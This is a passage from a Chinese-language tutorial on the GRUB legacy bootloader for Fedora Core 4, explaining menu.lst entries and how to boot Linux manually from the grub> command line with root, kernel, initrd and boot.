起个简单的名，以title开头，然后一个空格，后面就自己发挥吧，FC4或FC4x都行；</p><p>kernel 空格 (hd0,6)&#x2F;boot&#x2F;vmlinuz-2.6.11-1.1369_FC4 空格 ro 空格 root&#x3D;&#x2F;dev&#x2F;hda7</p><p>kernel 这行这样理解 kernel (boot所在的分区)&#x2F;boot&#x2F;内核文件件全称 ro root&#x3D;Linux根所位于的分区或标签</p><p>initrd 空格 (hd0,6)&#x2F;boot&#x2F;initrd-2.6.11-1.1369_FC4.img<br>initrd 这行可以这样理解 initrd (&#x2F;boot所在的分区)&#x2F;boot&#x2F;内核文件名全称</p><h3 id="2）第二种情况：-x2F-boot独立一个分区，和Linux的根分区不是同一个分区；"><a href="#2）第二种情况：-x2F-boot独立一个分区，和Linux的根分区不是同一个分区；" class="headerlink" title="2）第二种情况：&#x2F;boot独立一个分区，和Linux的根分区不是同一个分区；"></a>2）第二种情况：&#x2F;boot独立一个分区，和Linux的根分区不是同一个分区；</h3><p>比如我们查看到df -lh 得到的是</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> ~]<span class="hljs-comment"># df -lh</span><br>Filesystem            容量  已用 可用 已用% 挂载点<br><span class="hljs-regexp">/dev/hda</span>6              <span class="hljs-number">200</span>M  <span class="hljs-number">120</span>M  <span class="hljs-number">80</span>M  <span class="hljs-number">60</span>% <span class="hljs-regexp">/boot</span><br><span class="hljs-regexp">/dev</span><span class="hljs-regexp">/hda7              11G  9.2G  1.2G  90% /</span><br></code></pre></td></tr></table></figure><p>我们再进一行查看&#x2F;etc&#x2F;fstab 得知；</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/</span>                 <span class="hljs-symbol">/</span>                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/boot</span>             <span class="hljs-symbol">/boot</span>                   ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>所以我们应该写成如下的；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span> FC4x<br>        <span class="hljs-attribute">kernel</span> (hd0,<span class="hljs-number">5</span>)/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=LABEL=/<br>        <span class="hljs-attribute">initrd</span> (hd0,<span class="hljs-number">5</span>)/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br></code></pre></td></tr></table></figure><p>因为Linux的根分区是&#x2F;dev&#x2F;hda7，通过&#x2F;etc&#x2F;fstab和df -h的内容得知标签为 LABEL&#x3D;&#x2F;的分区就是&#x2F;dev&#x2F;hda7 ，所以有；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span> FC4x<br>        <span class="hljs-attribute">kernel</span> (hd0,<span class="hljs-number">5</span>)/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=/dev/hda7<br>        <span class="hljs-attribute">initrd</span> (hd0,<span class="hljs-number">5</span>)/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br></code></pre></td></tr></table></figure><h1 id="五、通过GRUB命令行来启动Linux操作系统；"><a href="#五、通过GRUB命令行来启动Linux操作系统；" class="headerlink" title="五、通过GRUB命令行来启动Linux操作系统；"></a>五、通过GRUB命令行来启动Linux操作系统；</h1><p>GRUB的命令行才是王道，如果知道怎么用命令行来启动操作系统，那理解menu.lst的写法也不难；也就是说在开机的时候，不用GRUB的菜单，通过GRUB的命令也是一样能把操作系统引导起来。</p><p>因为menu.lst的内容就是GRUB的一个一个的指令集合；是不是Linux这玩意很神奇？</p><h2 id="1、为什么需要学习GRUB的命令行；"><a href="#1、为什么需要学习GRUB的命令行；" class="headerlink" title="1、为什么需要学习GRUB的命令行；"></a>1、为什么需要学习GRUB的命令行；</h2><p>当我们把GRUB的menu.lst写错的时候，或者丢掉了menu.lst的时，比如在开机的时候，GRUB会出现grub&gt;类似的命令提示符，这时需要我们用命令行启动系统；当然您可以不用定义GRUB的菜单 ，直接用命令行来启动系统，比如我现在就是，为了写GRUB的文档，就把menu.lst 删除了，直接用命令来启动系统；</p><h2 id="2、用命令行来引导Linux操作系统的步骤；"><a href="#2、用命令行来引导Linux操作系统的步骤；" class="headerlink" title="2、用命令行来引导Linux操作系统的步骤；"></a>2、用命令行来引导Linux操作系统的步骤；</h2><p>通过命令行来引导操作系统的流程，也没有什么难的；无非是把指令手工输入到grub&gt;提示符的后面；在这个过程中，tab键的命令补齐功能就显得很重要了。如果您不知道有哪些命令，可以输入help；</p><h3 id="1）进入GRUB的命令行模式-grub-gt"><a href="#1）进入GRUB的命令行模式-grub-gt" class="headerlink" title="1）进入GRUB的命令行模式 grub&gt;"></a>1）进入GRUB的命令行模式 grub&gt;</h3><p>如果开机时，GRUB出现的是grub&gt;，说明你没有&#x2F;etc&#x2F;grub&#x2F;menu.lst ，您需要自己写一个才会GRUB的菜单，让我们来选择进入哪个系统。如果有GRUB的菜单，您可以按Ctrl+c组合键进入GRUB的命令行模式，会出现grub&gt; 提示符；</p><pre><code>grub&gt;</code></pre><h3 id="2）获取帮助GRUB的-help"><a href="#2）获取帮助GRUB的-help" class="headerlink" title="2）获取帮助GRUB的 help"></a>2）获取帮助GRUB的 help</h3><p>只要您在grub&gt;提示符的后面输入help 就能得到GRUB所有的命令提示；</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs inform7">grub&gt; help<br>blocklist FILE                         boot<br>cat FILE                               chainloader <span class="hljs-comment">[--force]</span> FILE<br>clear                                  color NORMAL <span class="hljs-comment">[HIGHLIGHT]</span><br>configfile FILE                        device DRIVE DEVICE<br>displayapm                             displaymem<br>find FILENAME                          geometry DRIVE <span class="hljs-comment">[CYLINDER HEAD SECTOR <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">halt <span class="hljs-comment">[--no-apm]</span>                        help <span class="hljs-comment">[--all]</span> <span class="hljs-comment">[PATTERN ...]</span></span></span><br><span class="hljs-comment"><span class="hljs-comment">hide PARTITION                         initrd FILE <span class="hljs-comment">[ARG ...]</span></span></span><br><span class="hljs-comment"><span class="hljs-comment">kernel <span class="hljs-comment">[--no-mem-option]</span> <span class="hljs-comment">[--type=TYPE]</span> makeactive</span></span><br><span class="hljs-comment"><span class="hljs-comment">map TO_DRIVE FROM_DRIVE                md5crypt</span></span><br><span class="hljs-comment"><span class="hljs-comment">module FILE <span class="hljs-comment">[ARG ...]</span>                  modulenounzip FILE <span class="hljs-comment">[ARG ...]</span></span></span><br><span class="hljs-comment"><span class="hljs-comment">pager <span class="hljs-comment">[FLAG]</span>                           partnew PART TYPE START LEN</span></span><br><span class="hljs-comment"><span class="hljs-comment">parttype PART TYPE                     quit</span></span><br><span class="hljs-comment"><span class="hljs-comment">reboot                                 root <span class="hljs-comment">[DEVICE <span class="hljs-comment">[HDBIAS]</span>]</span></span></span><br><span class="hljs-comment"><span class="hljs-comment">rootnoverify <span class="hljs-comment">[DEVICE <span class="hljs-comment">[HDBIAS]</span>]</span>         serial <span class="hljs-comment">[--unit=UNIT]</span> <span class="hljs-comment">[--port=PORT]</span> <span class="hljs-comment">[--</span></span></span><br><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment">setkey <span class="hljs-comment">[TO_KEY FROM_KEY]</span>               setup <span class="hljs-comment">[--prefix=DIR]</span> <span class="hljs-comment">[--stage2=STAGE2_</span></span></span></span><br><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment">terminal <span class="hljs-comment">[--dumb]</span> <span class="hljs-comment">[--no-echo]</span> <span class="hljs-comment">[--no-ed terminfo <span class="hljs-comment">[--name=NAME --cursor-address</span></span></span></span></span></span><br><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment">testvbe MODE                           unhide PARTITION</span></span></span></span></span></span><br><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment"><span class="hljs-comment">uppermem KBYTES                        vbeprobe <span class="hljs-comment">[MODE]</span></span></span></span></span></span></span><br></code></pre></td></tr></table></figure><p>如果需要得到某个指令的帮助，就在 help 后面空一格，然后输入指令，比如；</p><pre><code>grub&gt;help kernel </code></pre><h3 id="3）cat的用法；"><a href="#3）cat的用法；" class="headerlink" title="3）cat的用法；"></a>3）cat的用法；</h3><p>cat指令是用来查看文件内容的，有时我们不知道Linux的&#x2F;boot分区，以及&#x2F;根分区所在的位置，要查看&#x2F;etc&#x2F;fstab的内容来得知，这时，我们就要用到cat (hd[0-n],y)&#x2F;etc&#x2F;fstab 来获得这些内容；注意要学会用tab键命令补齐的功能；</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">grub&gt; cat (     按<span class="hljs-built_in">tab</span> 键会出来hd0或hd1之类的；<br>grub&gt; cat (hd0, 注：输入hd0,然后再按<span class="hljs-built_in">tab</span>键；会出来分区之类的；<br>grub&gt; cat (hd0,<span class="hljs-number">6</span>)<br>Possible partitions are:<br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">0</span>,  Filesystem type <span class="hljs-literal">unknown</span>, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0x7</span><br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">4</span>,  Filesystem type <span class="hljs-built_in">is</span> fat, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0xb</span><br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">5</span>,  Filesystem type <span class="hljs-built_in">is</span> reiserfs, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0x83</span><br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">6</span>,  Filesystem type <span class="hljs-built_in">is</span> ext2fs, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0x83</span><br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">7</span>,  Filesystem type <span class="hljs-literal">unknown</span>, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0x83</span><br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">8</span>,  Filesystem type <span class="hljs-built_in">is</span> reiserfs, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0x83</span><br>   Partition <span class="hljs-built_in">num</span>: <span class="hljs-number">9</span>,  Filesystem type <span class="hljs-literal">unknown</span>, <span class="hljs-built_in">partition</span> type <span class="hljs-number">0x82</span><br></code></pre></td></tr></table></figure><pre><code>grub&gt; cat (hd0,6)/etc/fstab 注：比如我想查看一下 (hd0,6)/etc/fstab的内容就这样输入；</code></pre><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/</span>                 <span class="hljs-symbol">/</span>                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">/dev/devpts</span>             <span class="hljs-symbol">/dev/pts</span>                devpts  gid<span class="hljs-operator">=</span><span class="hljs-number">5</span>,mode<span class="hljs-operator">=</span><span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/shm</span>                <span class="hljs-symbol">/dev/shm</span>                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/proc</span>               <span class="hljs-symbol">/proc</span>                   proc    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/sys</span>                <span class="hljs-symbol">/sys</span>                    sysfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span>SWAP-hda1         swap                    swap    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">/dev/hdc</span>                <span class="hljs-symbol">/media/cdrecorder</span>       auto    pamconsole,exec,noauto,<br>managed <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>有的弟兄可能会说，我不知道Linux安装在了哪个分区。那根据文件系统来判断一个一个的尝试总可以吧我；只要能cat出&#x2F;etc&#x2F;fstab就能为以后引导带来方便；</p><p>主要查看&#x2F;etc&#x2F;fstab中的内容，主要是Linux的&#x2F;分区及&#x2F;boot是否是独立的分区；如果没有&#x2F;boot类似的行，证明&#x2F;boot和 Linux的&#x2F;处于同一个硬盘分区；比如上面的例子中LABEL&#x3D;&#x2F; 这行是极为重要的；说明Linux系统就安在标签为LABEL&#x3D;&#x2F;的分区中；</p><p>如果您的Linux系统&#x2F;boot和&#x2F;没有位于同一个分区，可能cat (hd[a-n],y) 查到的是类似下面的；</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/</span>                 <span class="hljs-symbol">/</span>                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>L<span class="hljs-attr">ABEL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/boot</span>             <span class="hljs-symbol">/boot</span>                   ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="4）-root-hd-0-n-y-指令来指定-x2F-boot所在的分区；"><a href="#4）-root-hd-0-n-y-指令来指定-x2F-boot所在的分区；" class="headerlink" title="4） root (hd[0-n,y) 指令来指定&#x2F;boot所在的分区；"></a>4） root (hd[0-n,y) 指令来指定&#x2F;boot所在的分区；</h3><p>其实这个root (hd[0,n],y)是可以省略的，如果省略了，我们要在kerenl 命令中指定；我们前面已经说过 (hd[0-n],y) 硬盘分区的表示方法的用途；主要是用来指定 &#x2F;boot所在的分区；</p><p>比如我们确认&#x2F;boot和 (hd0,6)，所以就可以这样来输入root (hd0,6)</p><pre><code>grub&gt; root (hd0,6)</code></pre><p>如果发现不对，可以重新来过；没有什么大不了的；</p><h3 id="5）-kernel-指令，用来指定Linux的内核，及所在的分区；"><a href="#5）-kernel-指令，用来指定Linux的内核，及所在的分区；" class="headerlink" title="5） kernel 指令，用来指定Linux的内核，及所在的分区；"></a>5） kernel 指令，用来指定Linux的内核，及所在的分区；</h3><p>kernel 这个指令可能初学者有点怕，不知道内核在哪个分区，及内核文件名的全称是什么。不要忘记tab键的命令补齐的应用；</p><p>如果我们已经通过root (hd[0-n],y) 指定了&#x2F;boot所在的分区，语法有两个：</p><p>如果&#x2F;boot和Linux的&#x2F;位于同一个分区，应该是下面的一种格式；</p><p>kernel &#x2F;boot&#x2F;vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X</p><p>如果&#x2F;boot有自己独立的分区，应该是；</p><p>kernel &#x2F;vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X</p><p>在这里 root&#x3D;&#x2F;dev&#x2F;hd[a-z]X 是Linux 的&#x2F;根所位于的分区，如果不知道是哪个分区，就用tab出来的来计算，一个一个的尝试；或用cat (hd[0-n],y)&#x2F;etc&#x2F;fstab 中得到Linux的&#x2F;所在的分区或分区的标签；</p><pre><code>grub&gt; kernel /boot/在这里按tab键；这样就列出/boot中的文件了；</code></pre><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Possible files are: grub initrd<span class="hljs-string">-2</span>.6.11<span class="hljs-string">-1</span>.1369_FC4.img System.map<span class="hljs-string">-2</span>.6.11<span class="hljs-string">-1</span>.1369<br>_FC4 config<span class="hljs-string">-2</span>.6.11<span class="hljs-string">-1</span>.1369_FC4 vmlinuz<span class="hljs-string">-2</span>.6.11<span class="hljs-string">-1</span>.1369_FC4 grubBAK memtest86+<span class="hljs-string">-1</span>.55<br>.1 xen-syms xen.gz<br><br>grub&gt; kernel /boot/vmlinuz<span class="hljs-string">-2</span>.6.11<span class="hljs-string">-1</span>.1369_FC4 ro root=LABEL=/ <br>   [Linux-bzImage, setup=0x1e00, size=0x18e473]<br></code></pre></td></tr></table></figure><p>注解： root&#x3D;LABEL&#x3D;&#x2F; 是Linux的&#x2F;所在的分区的文件系统的标签；如果您知道Linux的&#x2F;在哪个具体的分区，用root&#x3D;&#x2F;dev&#x2F;hd[a-z]X来指定也行。比如下面的一行也是可以的；</p><pre><code>grub&gt; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7</code></pre><p>也可以把&#x2F;boot所在的分区的指定 root (hd[0-n],y)这行省掉，直接在kernel 中指定&#x2F;boot所在的分区；所以就在下面的语法；</p><p>如果是&#x2F;boot和Linux的根同处一个分区；<br>kernel (hd[0-n],y)&#x2F;boot&#x2F;vmlinuz ro root&#x3D;&#x2F;dev&#x2F;hd[a-z]X</p><p>比如：</p><pre><code>grub&gt;kernel</code></pre><p>如果是&#x2F;boot和Linux所在的根不在一个分区；则是；</p><pre><code>kernel (hd[0-n],y)/vmlinuz  ro root=/dev/hd[a-z]Xgrub&gt; kernel (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7 [Linux-bzImage, setup=0x1e00, size=0x18e473]</code></pre><p>或下面的输入，以cat 出&#x2F;etc&#x2F;fstab内容为准；</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">grub&gt; kernel (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro <span class="hljs-attribute">root</span>=LABEL=/<br>   [Linux-bzImage, <span class="hljs-attribute">setup</span>=0x1e00, <span class="hljs-attribute">size</span>=0x18e473]<br></code></pre></td></tr></table></figure><h3 id="6）initrd-命令行来指定initrd文件；"><a href="#6）initrd-命令行来指定initrd文件；" class="headerlink" title="6）initrd 命令行来指定initrd文件；"></a>6）initrd 命令行来指定initrd文件；</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">initrd /boot/initrd在这里tab 来补齐；</span><br><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">initrd /boot/initrd-2.6.11-1.1369_FC4.img</span><br>   [Linux-initrd @ 0x2e1000, 0x10e685 bytes]<br></code></pre></td></tr></table></figure><p>如果&#x2F;boot是独立的一个分区，应该是如下样子的语法；比如下面的；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">initrd /initrd在这里tab 来补齐；</span><br><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">initrd /initrd-2.6.11-1.1369_FC4.img</span><br>   [Linux-initrd @ 0x2e1000, 0x10e685 bytes]<br></code></pre></td></tr></table></figure><h3 id="7）boot-引导系统；"><a href="#7）boot-引导系统；" class="headerlink" title="7）boot 引导系统；"></a>7）boot 引导系统；</h3><pre><code>grub&gt;boot</code></pre><p>前面的几个步骤都弄好 。就进入引导；尝试一下就知道了。。</p><h3 id="8）引导Linux系统实例全程回放；"><a href="#8）引导Linux系统实例全程回放；" class="headerlink" title="8）引导Linux系统实例全程回放；"></a>8）引导Linux系统实例全程回放；</h3><p>实例：&#x2F;boot和Linux的&#x2F;处于同一个硬盘分区；</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tcl">grub&gt; cat (hd0,<span class="hljs-number">6</span>)/etc/fstab<br><span class="hljs-comment"># This file is edited by fstab-sync - see &#x27;man fstab-sync&#x27; for details</span><br>LABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>/dev/devpts             /dev/pts                devpts  gid=<span class="hljs-number">5</span>,mode=<span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>/dev/shm                /dev/shm                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>/dev/<span class="hljs-keyword">proc</span>               /<span class="hljs-keyword">proc</span><span class="hljs-title">                   proc</span> <span class="hljs-title">   defaults</span>        0 0<br>/dev/sys                /sys<span class="hljs-title">                    sysfs</span> <span class="hljs-title">  defaults</span>        0 0<span class="hljs-title"></span><br><span class="hljs-title">LABEL=SWAP-hda1</span> <span class="hljs-title">        swap</span> <span class="hljs-title">                   swap</span> <span class="hljs-title">   defaults</span>        0 0<br>/dev/hdc                /media/cdrecorder<span class="hljs-title">       auto</span> <span class="hljs-title">   pamconsole,exec,noauto,managed</span> 0 0<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> root (hd0,6)<span class="hljs-title"></span><br><span class="hljs-title">Filesystem</span> type<span class="hljs-title"> is</span> ext2fs,<span class="hljs-title"> partition</span> type 0x83<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> kernel /boot/在这里按tab补齐，全列出/boot所有的文件；<span class="hljs-title"></span><br><span class="hljs-title">Possible</span> files<span class="hljs-title"> are:</span> grub<span class="hljs-title"> initrd-2.6.11-1.1369_FC4.img</span> System.map-2.6.11-1.1369_FC4<span class="hljs-title"> config-2.6.11-1.1369_FC4</span> vmlinuz-2.6.11-1.1369_FC4<span class="hljs-title"> </span><br><span class="hljs-title">memtest86+-1.55.1</span> xen-syms<span class="hljs-title"> xen.gz</span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> kernel /boot/vmlinuz-2.6.11-1.1369_FC4<span class="hljs-title"> ro</span> root=/dev/hda7  注：输入<br>   [Linux-bzImage,<span class="hljs-title"> setup=0x1e00,</span> size=0x18e473]<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> initrd /boot/在这里按tab补齐<span class="hljs-title"></span><br><span class="hljs-title">Possible</span> files<span class="hljs-title"> are:</span> grub<span class="hljs-title"> initrd-2.6.11-1.1369_FC4.img</span> System.map-2.6.11-1.1369_FC4<span class="hljs-title"> config-2.6.11-1.1369_FC4</span> vmlinuz-2.6.11-1.1369_FC4<span class="hljs-title"> </span><br><span class="hljs-title">memtest86+-1.55.1</span> xen-syms<span class="hljs-title"> xen.gz</span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> initrd /boot/initrd-2.6.11-1.1369_FC4.img 注;输入intrd文件名的全名；<br>   [Linux-initrd @ 0x2e1000, 0x10e685<span class="hljs-title"> bytes]</span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> boot<br></code></pre></td></tr></table></figure><p>我们指定Linux的根时，可以用cat出来的fstab的内容中Linux的&#x2F;分区文件系统标签来替代；也就是kernel 那行中 root&#x3D;&#x2F;dev&#x2F;hd[a-z]X；</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs tcl">grub&gt; cat (hd0,<span class="hljs-number">6</span>)/etc/fstab<br><span class="hljs-comment"># This file is edited by fstab-sync - see &#x27;man fstab-sync&#x27; for details</span><br>LABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>/dev/devpts             /dev/pts                devpts  gid=<span class="hljs-number">5</span>,mode=<span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>/dev/shm                /dev/shm                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>/dev/<span class="hljs-keyword">proc</span>               /<span class="hljs-keyword">proc</span><span class="hljs-title">                   proc</span> <span class="hljs-title">   defaults</span>        0 0<br>/dev/sys                /sys<span class="hljs-title">                    sysfs</span> <span class="hljs-title">  defaults</span>        0 0<span class="hljs-title"></span><br><span class="hljs-title">LABEL=SWAP-hda1</span> <span class="hljs-title">        swap</span> <span class="hljs-title">                   swap</span> <span class="hljs-title">   defaults</span>        0 0<br><br>/dev/hdc                /media/cdrecorder<span class="hljs-title">       auto</span> <span class="hljs-title">   pamconsole,exec,noauto,managed</span> 0 0<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> root (hd0,6)<span class="hljs-title"></span><br><span class="hljs-title">Filesystem</span> type<span class="hljs-title"> is</span> ext2fs,<span class="hljs-title"> partition</span> type 0x83<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> kernel /boot/在这里按tab补齐，全列出/boot所有的文件；<span class="hljs-title"></span><br><span class="hljs-title">Possible</span> files<span class="hljs-title"> are:</span> grub<span class="hljs-title"> initrd-2.6.11-1.1369_FC4.img</span> System.map-2.6.11-1.1369_FC4<span class="hljs-title"> config-2.6.11-1.1369_FC4</span> vmlinuz-2.6.11-1.1369_FC4<span class="hljs-title"> </span><br><span class="hljs-title">memtest86+-1.55.1</span> xen-syms<span class="hljs-title"> xen.gz</span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> kernel /boot/vmlinuz-2.6.11-1.1369_FC4<span class="hljs-title"> ro</span> root=LABEL=/ <br>   [Linux-bzImage,<span class="hljs-title"> setup=0x1e00,</span> size=0x18e473]<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> initrd /boot/在这里按tab补齐<span class="hljs-title"></span><br><span class="hljs-title">Possible</span> files<span class="hljs-title"> are:</span> grub<span class="hljs-title"> initrd-2.6.11-1.1369_FC4.img</span> System.map-2.6.11-1.1369_FC4<span class="hljs-title"> config-2.6.11-1.1369_FC4</span> vmlinuz-2.6.11-1.1369_FC4<span class="hljs-title"> grubBAK</span><br>memtest86+-1.55.1<span class="hljs-title"> xen-syms</span> xen.gz<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> initrd /boot/initrd-2.6.11-1.1369_FC4.img 注;输入intrd文件名的全名；<br>   [Linux-initrd @ 0x2e1000, 0x10e685<span class="hljs-title"> bytes]</span><br><span class="hljs-title"></span><br><span class="hljs-title">grub&gt;</span> boot<br></code></pre></td></tr></table></figure><p>如果是&#x2F;boot和Linux的根分区不在同一个分区，要把kernel和initrd 